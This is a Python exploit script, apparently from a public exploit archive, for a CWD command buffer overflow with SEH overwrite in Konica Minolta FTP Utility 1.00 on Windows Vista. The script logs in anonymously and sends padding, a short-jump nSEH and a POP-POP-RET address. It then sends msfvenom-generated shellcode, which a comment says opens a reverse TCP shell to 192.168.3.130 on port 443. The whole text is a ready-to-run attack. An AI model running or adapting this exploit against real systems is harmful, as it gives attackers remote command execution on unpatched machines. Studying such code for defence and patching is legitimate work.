# Author	: RIZAL MUHAMMED [UB3RSiCK]
# Desc.		: Konica Minolta FTP Utility 1.00 - CWD Command Overflow (SEH)
# OS		: Windows Vista ULTIMATE x86 SP2
# Date		: 11/03/2018

import struct
import sys
from socket import create_connection as cc

def p(a):
	return struct.pack("I", a)

if len(sys.argv) < 2:
	print "Usage: {} TARGET_IP".format(sys.argv[0])
	sys.exit()

host = sys.argv[1]
port = 21

try:
	sock = cc((host, port))
except:
	print "Connection Failed"
	sys.exit()

print "Connection Successfull"
banner = sock.recv(1024)
print banner

anonname = "USER Anonymous\r\n"
anonpass = "PASS whatever\r\n"

sock.send(anonname)
r = sock.recv(1024)
print r
sock.send(anonpass)
r = sock.recv(1024)
print r


# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.3.130 LPORT=443 EXITFUNC=thread -f c -b "\x00\x0a\x0d" -e x86/shikata_ga_nai
shellcode = ("\xd9\xc7\xd9\x74\x24\xf4\x5b\xbf\xa1\xb1\x9d\x82\x31\xc9\xb1"
"\x52\x31\x7b\x17\x03\x7b\x17\x83\x4a\x4d\x7f\x77\x70\x46\x02"
"\x78\x88\x97\x63\xf0\x6d\xa6\xa3\x66\xe6\x99\x13\xec\xaa\x15"
"\xdf\xa0\x5e\xad\xad\x6c\x51\x06\x1b\x4b\x5c\x97\x30\xaf\xff"
"\x1b\x4b\xfc\xdf\x22\x84\xf1\x1e\x62\xf9\xf8\x72\x3b\x75\xae"
"\x62\x48\xc3\x73\x09\x02\xc5\xf3\xee\xd3\xe4\xd2\xa1\x68\xbf"
"\xf4\x40\xbc\xcb\xbc\x5a\xa1\xf6\x77\xd1\x11\x8c\x89\x33\x68"
"\x6d\x25\x7a\x44\x9c\x37\xbb\x63\x7f\x42\xb5\x97\x02\x55\x02"
"\xe5\xd8\xd0\x90\x4d\xaa\x43\x7c\x6f\x7f\x15\xf7\x63\x34\x51"
"\x5f\x60\xcb\xb6\xd4\x9c\x40\x39\x3a\x15\x12\x1e\x9e\x7d\xc0"
"\x3f\x87\xdb\xa7\x40\xd7\x83\x18\xe5\x9c\x2e\x4c\x94\xff\x26"
"\xa1\x95\xff\xb6\xad\xae\x8c\x84\x72\x05\x1a\xa5\xfb\x83\xdd"
"\xca\xd1\x74\x71\x35\xda\x84\x58\xf2\x8e\xd4\xf2\xd3\xae\xbe"
"\x02\xdb\x7a\x10\x52\x73\xd5\xd1\x02\x33\x85\xb9\x48\xbc\xfa"
"\xda\x73\x16\x93\x71\x8e\xf1\x5c\x2d\x93\x83\x35\x2c\x93\x82"
"\x7e\xb9\x75\xee\x90\xec\x2e\x87\x09\xb5\xa4\x36\xd5\x63\xc1"
"\x79\x5d\x80\x36\x37\x96\xed\x24\xa0\x56\xb8\x16\x67\x68\x16"
"\x3e\xeb\xfb\xfd\xbe\x62\xe0\xa9\xe9\x23\xd6\xa3\x7f\xde\x41"
"\x1a\x9d\x23\x17\x65\x25\xf8\xe4\x68\xa4\x8d\x51\x4f\xb6\x4b"
"\x59\xcb\xe2\x03\x0c\x85\x5c\xe2\xe6\x67\x36\xbc\x55\x2e\xde"
"\x39\x96\xf1\x98\x45\xf3\x87\x44\xf7\xaa\xd1\x7b\x38\x3b\xd6"
"\x04\x24\xdb\x19\xdf\xec\xfb\xfb\xf5\x18\x94\xa5\x9c\xa0\xf9"
"\x55\x4b\xe6\x07\xd6\x79\x97\xf3\xc6\x08\x92\xb8\x40\xe1\xee"
"\xd1\x24\x05\x5c\xd1\x6c")

#buf = 1500 pattern

#  crashed around 1500 A's
#payload = "CWD " + "A"*1500

payload = "CWD "

# SEH Offset 1041
# nSEH Offset 1037

# PPR 122063B0
SEH = p(0x122063B0)
nSEH = "\xEB\x08\x90\x90"

payload += "A"*1037 + nSEH + SEH + "\x90" * 16 + shellcode + "\x90" *64
payload += "\r\n"


print "[*] Sending UB3R CWD command xD"
sock.send(payload)

